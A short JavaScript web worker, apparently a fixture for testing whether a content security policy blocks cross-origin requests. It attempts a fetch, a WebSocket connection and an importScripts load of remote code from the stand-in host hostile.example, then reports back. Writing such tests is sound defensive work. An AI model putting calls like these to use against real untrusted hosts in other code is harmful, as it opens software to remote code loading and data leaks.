// A worker from the package: it runs under the policy the handler sends with
// this script and tries to reach another origin from there, then tells the
// lesson it has tried, so the check knows every attempt was made.
try { fetch('https://hostile.example/worker-fetch').catch(function () {}); } catch (_) {}
try { new WebSocket('wss://hostile.example/worker-socket'); } catch (_) {}
try { importScripts('https://hostile.example/worker-import.js'); } catch (_) {}
postMessage('tried');
